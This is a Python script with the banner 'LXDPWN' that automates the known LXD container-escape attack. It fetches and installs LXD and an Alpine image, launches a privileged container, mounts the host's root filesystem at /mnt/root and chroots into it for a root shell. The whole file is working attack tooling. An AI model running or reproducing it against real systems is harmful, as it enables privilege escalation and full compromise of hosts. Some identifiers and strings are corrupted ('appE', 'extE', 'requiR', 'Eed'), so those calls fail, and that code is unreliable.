#!/usr/bin/env python3

import requests
import os
import hashlib
import sys
import subprocess
import pwd
import grp
import time

class S:
    H = '\033[95m'
    B = '\033[94m'
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    C = '\033[96m'
    M = '\033[95m'
    W = '\033[97m'
    O = '\033[1m'
    U = '\033[4m'
    E = '\033[0m'
    

    INFO = "ℹ "
    SUCCESS = "✓ "
    ERROR = "✗ "
    WARNING = "⚠ "
    DOWNLOAD = "↓ "
    INSTALL = "⚙ "
    CONTAINER = "📦"
    SHELL = "💻 "
    CLEAN = "🧹"
    WAIT = "⏳ "
    ARROW = "→ "
    STAR = "⭐ "
    GITHUB = "🐙 "

def print_banner():
   
    banner = S.R+"""
               

 _    __  ______  ______        ___   _ 
| |   \\ \\/ /  _ \\|  _ \\ \\      / / \\ | |
| |    \\  /| | | | |_) \\\\ /\\ / /|  \\| |
| |___ /  \\| |_| |  __/ \\ V  V / | |\\  |
|_____/_/\\_\\____/|_|     \\_/\\_/  |_| \\_|
               @jacstory

"""
    print(banner)

def print_step(icon, color, step, message):

    print(f"{color}{icon} {S.O}{step:12}{S.E} {color}│{S.E} {message}{S.E}")

def print_substep(message):
 
    print(f"    {S.C}└─{S.E} {message}")

def print_progress_bar(current, total, filename, bar_length=30):
 
    percent = float(current) * 100 / total
    filled = int(bar_length * current // total)
    bar = '█' * filled + '░' * (bar_length - filled)
    
  
    current_mb = current / (1024 * 1024)
    total_mb = total / (1024 * 1024)
    
    sys.stdout.write(f"\r    {S.C}↓{S.E} {S.O}{filename[:25]:25}{S.E} "
                     f"{S.G}[{bar}]{S.E} "
                     f"{S.W}{percent:5.1f}%{S.E} "
                     f"{S.M}({current_mb:5.1f}/{total_mb:5.1f} MB){S.E}")
    sys.stdout.flush()

def print_section(title):

    print()
    print(f"{S.Y}{S.O}═══ {title} ═══{S.E}")
    print()

def print_success_box(message):

    length = len(message) + 6
    print(f"{S.G}┌{'─' * length}┐{S.E}")
    print(f"{S.G}│  {message}  │{S.E}")
    print(f"{S.G}└{'─' * length}┘{S.E}")

class LXD_Helper:
    def __init__(self):
        print_banner()
        self.download_path = "/tmp/alpine"
        os.makedirs(self.download_path, exist_ok=True)
        
        print_section("INITIALIZATION")
        print_step(S.INFO, S.B, "WORKSPACE", f"Download directory: {self.download_path}")
        print()

        self.Check_compatibility()
        self.Check_LXD_Status()
        
        print_section("NETWORK CONFIGURATION")
        if self.check_connection():
            base_url = "https://github.com/jac11/LXD_Helper/releases/download/Lxd%2Bhelper/"
        else:
            base_url = self.get_offline_server()
            
        print_section("FILE DOWNLOAD")
        self.download_files(base_url)
        
        print_section("LXD INSTALLATION")
        self.Set_LXD()
        
        print_section("CONTAINER SETUP")
        self.ImageLoad('/tmp/alpine/alpine-v3.13-x86_64-20210218_0139.tar.gz')
        
    def cleanup(self):
        print_step(S.CLEAN, S.Y, "CLEANUP", "Stopping and removing containers...")
        subprocess.run(["sudo", "lxc", "stop", "alpine-container", "--force"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "lxc", "delete", "alpine-container"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "lxc", "image", "delete", "alpine-local"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_step(S.SUCCESS, S.G, "DONE", "Cleanup completed successfully")
    
    def Check_compatibility(self):
        print_step(S.INFO, S.B, "SYSTEM", "Checking system compatibility...")
        
        if os.geteuid() != 0:
            print_step(S.ERROR, S.R, "ERROR", "This script must be run as root")
            sys.exit(1)
            
        username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
        user_info = pwd.getpwnam(username)
        groups = [
            g.gr_name for g in grp.getgrall()
            if username in g.gr_mem or g.gr_gid == user_info.pw_gid
        ]
        
        print_substep(f"User: {S.O}{username}{S.E}")
        print_substep(f"Groups: {S.O}{', '.join(groups)}{S.E}")

        if os.geteuid() == 0:
            print_step(S.SUCCESS, S.G, "OK", "Running as root — LXD group not requiR")
            return True
            
        if "lxd" not in groups:
            print_step(S.WARNING, S.Y, "WARN", f"User {username} not in group LXD")
            return False
            
        print_step(S.SUCCESS, S.G, "OK", "Compatibility check passed")
        return True

    def check_connection(self):
        print_step(S.INFO, S.B, "NETWORK", "Checking internet connection...")
        try:
            requests.get("https://github.com", timeout=5)
            print_step(S.SUCCESS, S.G, "ONLINE", "Connection established")
            return True
        except requests.RequestException:
            print_step(S.WARNING, S.Y, "OFFLINE", "No internet connection detected")
            return False

    def get_offline_server(self):
        print_step(S.INFO, S.B, "SERVER", "Configure offline server")
        print()
        print(f"    {S.C}┌─{S.E} {S.O}Offline Server Configuration{S.E}")
        print(f"    {S.C}├─{S.E} {S.Y}Start your local web server first{S.E}")
        print(f"    {S.C}├─{S.E} Example: {S.G}python3 -m http.server 8000{S.E}")
        print(f"    {S.C}└─{S.E}")
        print()
        
        server_ip = input(f"    {S.C}└─ Enter server IP{S.E} : ").strip()
        try:
            server_port = int(input(f"    {S.C}└─ Enter Port (default 80){S.E}: "))
        except ValueError:
            server_port = 80
            
        print()
        print_step(S.SUCCESS, S.G, "SERVER", f"ConfiguR: {S.O}{server_ip}:{server_port}{S.E}")
        return f"http://{server_ip}:{server_port}/"

    def download_files(self, base_url):
        print_step(S.DOWNLOAD, S.C, "START", "Beginning download process...")
        print()

        files = {
            "alpine-v3.13-x86_64-20210218_0139.tar.gz": "Alpine Linux Image",
            "core_17272.assert": "Core Snap Assertion",
            "core_17272.snap": "Core Snap Package",
            "lxd_37395.assert": "LXD Snap Assertion",
            "lxd_37395.snap": "LXD Snap Package",
            "snapd_2.71-3+b1_amd64.deb": "Snapd Package",
        }

        total_files = len(files)
        completed = 0
        total_bytes = 0
        
        for filename, description in files.items():
            url = base_url + filename
            save_path = os.path.join(self.download_path, filename)

            if os.path.exists(save_path) and os.path.getsize(save_path) > 0:
                file_size = os.path.getsize(save_path)
                total_bytes += file_size
                print_step(S.SUCCESS, S.G, "EXISTS", f"{filename} ({description})")
                completed += 1
                continue
                
            try:
                print(f"    {S.C}↓{S.E} {S.O}{description}{S.E}")
                print(f"    {S.C}  └─{S.E} {S.W}{filename}{S.E}")
                
                response = requests.get(url, stream=True, timeout=15)
                response.raise_for_status()
                
                total_size = int(response.headers.get('content-length', 0))
                downloaded = 0

                with open(save_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                            if total_size > 0:
                                print_progress_bar(downloaded, total_size, filename[:25])
                
                print()
                total_bytes += downloaded
                print_step(S.SUCCESS, S.G, "DONE", f"{description} downloaded")
                completed += 1

            except requests.RequestException as e:
                print()  # New line after progress bar
                print_step(S.ERROR, S.R, "FAILED", f"{description} - {str(e)[:50]}")

        print()
        print_step(S.SUCCESS, S.G, "SUMMARY", f"Downloaded {completed}/{total_files} files")
        print_substep(f"Total size: {S.M}{total_bytes/(1024*1024):.1f} MB{S.E}")
        print_substep(f"Location: {S.C}{self.download_path}{S.E}")
        
    def Check_LXD_Status(self):
        print_step(S.INFO, S.B, "STATUS", "Checking LXD installation status...")
        
        self.snap_installed = True
        self.lxd_installed = True
        self.lxd_initialized = True
        
        try:
            result = subprocess.run(["snap", "version"], check=True,
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            version = result.stdout.split('\n')[0].split()[-1] if result.stdout else "unknown"
            print_step(S.SUCCESS, S.G, "SNAP", f"snapd is installed (v{version})")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print_step(S.WARNING, S.Y, "SNAP", "snapd not installed")
            self.snap_installed = False

   
        try:
            result = subprocess.run(["snap", "list", "lxd"], check=True,
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print_step(S.SUCCESS, S.G, "LXD", "LXD snap is installed")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print_step(S.WARNING, S.Y, "LXD", "LXD not installed")
            self.lxd_installed = False
            

        try:
            result = subprocess.run(["lxc", "info"], check=True,
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
       
            for line in result.stdout.split('\n'):
                if "version" in line.lower():
                    version = line.split(':')[-1].strip()
                    print_step(S.SUCCESS, S.G, "INIT", f"LXD is initialized (v{version})")
                    break
            else:
                print_step(S.SUCCESS, S.G, "INIT", "LXD is initialized")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print_step(S.WARNING, S.Y, "INIT", "LXD not initialized")
            self.lxd_initialized = False
            
        if self.snap_installed and self.lxd_installed and self.lxd_initialized:
            print_step(S.SUCCESS, S.G, "READY", "LXD is fully ready")
        else:
            print_step(S.INFO, S.B, "NEXT", "Additional installation requiR")
        try:
            checkPath = os.listdir('/tmp/alpine')
            expected = ['snapd_2.71-3+b1_amd64.deb', 'lxd_37395.snap',
                       'alpine-v3.13-x86_64-20210218_0139.tar.gz', 'core_17272.snap',
                       'core_17272.assert', 'lxd_37395.assert']
            
            if sorted(checkPath) == sorted(expected):
                print()
                print_success_box("✨ All requiR files are ready! ✨")
                print()
                self.ImageLoad('/tmp/alpine/alpine-v3.13-x86_64-20210218_0139.tar.gz')
                exit()
        except FileNotFoundError:
            pass
            
    def Set_LXD(self):
        print_step(S.INSTALL, S.M, "BEGIN", "Starting LXD installation...")
        print()
        
        commands = []
        if not self.snap_installed:
            commands.appE({
                "cmd": ["sudo", "dpkg", "-i", "/tmp/alpine/snapd_2.71-3+b1_amd64.deb"],
                "desc": "Installing snapd"
            })
            
        if not self.lxd_installed:
            commands.extE([
                {
                    "cmd": ["sudo", "snap", "ack", "/tmp/alpine/core_17272.assert"],
                    "desc": "Acknowledging core snap"
                },
                {
                    "cmd": ["sudo", "snap", "install", "/tmp/alpine/core_17272.snap"],
                    "desc": "Installing core snap"
                },
                {
                    "cmd": ["sudo", "snap", "ack", "/tmp/alpine/lxd_37395.assert"],
                    "desc": "Acknowledging LXD snap"
                },
                {
                    "cmd": ["sudo", "snap", "install", "/tmp/alpine/lxd_37395.snap"],
                    "desc": "Installing LXD snap"
                },
            ])

        if not commands:
            print_step(S.INFO, S.B, "SKIP", "LXD already installed, skipping installation")
            return

        for i, cmd_info in enumerate(commands, 1):
            cmd = cmd_info["cmd"]
            desc = cmd_info["desc"]
            cmd_str = ' '.join(cmd)
            
            print(f"    {S.C}[{i}/{len(commands)}]{S.E} {S.O}{desc}{S.E}")
            print(f"    {S.C}  └─{S.E} {S.W}{cmd_str}{S.E}")
            
            try:
                result = subprocess.run(cmd, check=True,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      text=True)
                print_step(S.SUCCESS, S.G, "OK", f"Step {i} completed")
                
            except subprocess.CalledProcessError as e:
                print_step(S.ERROR, S.R, "FAIL", f"Step {i} failed")
                print(f"    {S.R}Error: {e.stderr[:100]}{S.E}")
                return

        print()
        print_step(S.SUCCESS, S.G, "DONE", "LXD installation completed")
        
        try:
            print_step(S.WAIT, S.B, "SNAP", "Starting snapd service...")
            subprocess.run(["sudo", "systemctl", "start", "snapd"], check=True)

            print_step(S.WAIT, S.B, "WAIT", "Waiting for snap to be ready...")
            for attempt in range(10):
                result = subprocess.run(["snap", "version"],
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
                if result.returncode == 0:
                    print_step(S.SUCCESS, S.G, "READY", "snapd is responding")
                    break
                print(f"    {S.C}└─ Attempt {attempt+1}/10...{S.E}")
                time.sleep(1)
            else:
                print_step(S.ERROR, S.R, "ERROR", "snapd is not responding")
                return

            print_step(S.INSTALL, S.M, "INIT", "Running automatic LXD init...")
            subprocess.run(["sudo", "lxd", "init", "--auto"], check=True)

            print_step(S.INFO, S.B, "VERIFY", "Verifying LXD installation...")
            result = subprocess.run(["lxc", "info"],
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True)

            if result.returncode == 0:
                print_step(S.SUCCESS, S.G, "READY", "LXD is fully initialized and working")
                # Update status
                self.lxd_initialized = True
                self.lxd_installed = True
            else:
                print_step(S.ERROR, S.R, "FAIL", "LXD initialization failed")

        except subprocess.CalledProcessError as e:
            print_step(S.ERROR, S.R, "ERROR", f"LXD initialization failed: {e}")
            
    def ImageLoad(self, imagepath):
        print_step(S.CONTAINER, S.C, "START", "Setting up container...")
        print()

        print_step(S.INSTALL, S.M, "LXD", "Ensuring LXD is initialized...")
        try:
            subprocess.run(["sudo", "lxd", "init", "--auto"], check=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print_step(S.SUCCESS, S.G, "OK", "LXD is ready")
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "LXD initialization failed")
            return

        print_step(S.DOWNLOAD, S.C, "IMAGE", "Checking Alpine image...")
        if subprocess.run(["lxc", "image", "list", "alpine-local", "--format", "json"],
                         capture_output=True).returncode == 0:
            print_step(S.SUCCESS, S.G, "EXISTS", "Image already loaded")
            self.cleanup()

        print_step(S.DOWNLOAD, S.C, "IMPORT", "Importing Alpine image...")
        try:
            result = subprocess.run(["sudo", "lxc", "image", "import", imagepath, "--alias", "alpine-local"],
                                  check=True, capture_output=True, text=True)
         
            for line in result.stdout.split('\n'):
                if "fingerprint" in line:
                    fingerprint = line.split(':')[-1].strip()[:]
                    print_step(S.SUCCESS, S.G, "IMPORT", f"Image imported (fingerprint: {fingerprint})")
                    break
            else:
                print_step(S.SUCCESS, S.G, "IMPORT", "Image imported successfully")
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "Image import failed")
            return

        print_step(S.CONTAINER, S.C, "LAUNCH", "Launching privileged container...")
        try:
            result = subprocess.run([
                "sudo", "lxc", "launch",
                "alpine-local",
                "alpine-container",
                "-c", "security.privileged=true",
                "-c", "security.nesting=true"
            ], check=True, capture_output=True, text=True)
            
           
            time.sleep(3)
            print_step(S.SUCCESS, S.G, "START", "Container is running")
      
            status = subprocess.run(["lxc", "list", "alpine-container", "--format", "json"],
                                  capture_output=True, text=True)
            print_substep(f"Container: {S.O}alpine-container{S.E}")
            
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "Container launch failed")
            return

        print_step(S.INSTALL, S.M, "MOUNT", "Mounting host filesystem...")
        try:
            result = subprocess.run([
                "sudo", "lxc", "config", "device", "add",
                "alpine-container",
                "host-root",
                "disk",
                "source=/",
                "path=/mnt/root",
                "recursive=true"
            ], check=True, capture_output=True, text=True)
            print_step(S.SUCCESS, S.G, "MOUNT", "Host filesystem mounted at /mnt/root")
            #print("[+] Attempting to chroot into host system...")
            try:
                # Try to chroot into the mounted host system
                subprocess.run(
                    ["sudo", "lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/bash"],
                    check=True
                )
            except subprocess.CalledProcessError:
                print("[!] First chroot attempt failed, trying fallback...")
                # Fallback: try with different path or without chroot
                subprocess.run(
                    ["sudo", "lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/bash"],
                    check=False
                )
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "Failed to mount host filesystem")
            return

        print()
        print_success_box("🎉 Container is ready! Opening shell.. 🎉")
        print()
        print(f"    {S.Y}┌─{S.E} {S.O}Container Access{S.E}")
        print(f"    {S.Y}├─{S.E} Host filesystem: {S.C}/mnt/root{S.E}")
        print(f"    {S.Y}├─{S.E} Container name: {S.C}alpine-container{S.E}")
        print(f"    {S.Y}└─{S.E} Type {S.R}'exit'{S.E} to close the shell")
        print()
        
        subprocess.run(["sudo", "lxc", "exec", "alpine-container", "--", "/bin/sh"])
        
       
        print()
        print_step(S.INFO, S.B, "SHELL", "Shell session Eed")
        cleanup = input(f"    {S.Y}Cleanup container? (y/n){S.E}: ").strip().lower()
        if cleanup == 'y':
            self.cleanup()

if __name__ == '__main__':
    try:
        LXD_Helper()
    except KeyboardInterrupt:
        print()
        print_step(S.WARNING, S.Y, "EXIT", "Script interrupted by user")
        sys.exit(0)